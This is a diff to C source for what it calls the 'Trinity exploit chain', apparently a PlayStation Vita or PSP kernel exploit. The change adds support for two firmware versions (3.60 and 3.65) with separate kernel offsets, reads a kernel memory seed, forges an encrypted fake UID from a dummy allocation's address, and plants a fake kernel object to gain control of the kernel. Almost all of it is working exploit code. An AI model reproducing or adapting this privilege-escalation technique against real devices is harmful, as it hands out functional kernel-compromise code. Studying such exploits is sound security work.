@@ -26,9 +26,10 @@ Part of Trinity exploit chain.
 #define DUMP_PATH "ms0:/kram.bin"
 #define BUF_SIZE 10*1024 // 10KB buffer to minimize IO
 
-#define LIBC_CLOCK_OFFSET  0x88014D00 // 360: 0x88014D80
-#define SYSMEM_SEED_OFFSET 0x88014E38 // 360: 0x88014EB8
-#define FAKE_UID_OFFSET    0x8814CFA8
+#define LIBC_CLOCK_OFFSET_360  0x88014D80
+#define LIBC_CLOCK_OFFSET_365  0x88014D00
+#define SYSMEM_SEED_OFFSET_365 0x88014E38
+#define FAKE_UID_OFFSET        0x80
 
 UserFunctions* g_tbl;
 int (*_sceNpCore_8AFAB4A0)(int *input, char *string, int length);
@@ -39,6 +40,7 @@ int (*_sceNpCore_8AFAB4A0)(int *input, char *string, int length);
 static volatile int running;
 static volatile int idx;
 static int input[3];
+static int libc_clock_offset = LIBC_CLOCK_OFFSET_365;
 
 static int racer(SceSize args, void *argp) {
   running = 1;
@@ -111,7 +113,7 @@ void dumpKram(){
 
 void repairInstruction(KernelFunctions* k_tbl) {
     SceModule2 *mod = k_tbl->KernelFindModuleByName("sceRTC_Service");
-    _sw(mod->text_addr + 0x3904, LIBC_CLOCK_OFFSET);
+    _sw(mod->text_addr + 0x3904, libc_clock_offset);
     k_tbl->KernelIcacheInvalidateAll();
     k_tbl->KernelDcacheWritebackInvalidateAll(); 
 }
@@ -146,22 +148,23 @@ int doExploit(void) {
 
     int res;
 
-    u32 seed = readKram(SYSMEM_SEED_OFFSET);
-    PRTSTR1("Seed: %p", seed);
-
-    //if (!seed)
-    //    return -1;
-
-    SceUID uid = (((FAKE_UID_OFFSET & 0x00ffffff) >> 2) << 7) | 0x1;
-    SceUID encrypted_uid = uid ^ seed;
+    u32 seed = readKram(SYSMEM_SEED_OFFSET_365);
+    if (!seed)
+      libc_clock_offset = LIBC_CLOCK_OFFSET_360;
+    else
+      PRTSTR1("Seed: %p", seed);
 
     // Allocate dummy block to improve reliability
     char dummy[32];
     memset(dummy, 'a', sizeof(dummy));
     SceUID dummyid = g_tbl->KernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, dummy, PSP_SMEM_Low, 0x10, NULL);
 
+    u32 dummyaddr = 0x88000000 + ((dummyid >> 5) & ~3);
+    SceUID uid = ((((dummyaddr - FAKE_UID_OFFSET) & 0x00ffffff) >> 2) << 7) | 0x1;
+    SceUID encrypted_uid = seed != 0 ? uid ^ seed : uid;
+
     // Plant UID data structure into kernel as string
-    u32 string[] = { LIBC_CLOCK_OFFSET - 4, 0x88888888, 0x88016dc0, encrypted_uid, 0x88888888, 0x10101010, 0, 0 };
+    u32 string[] = { libc_clock_offset - 4, 0x88888888, 0x88016dc0, encrypted_uid, 0x88888888, 0x10101010, 0, 0 };
     SceUID plantid = g_tbl->KernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, (char *)&string, PSP_SMEM_Low, 0x10, NULL);
 
     /*
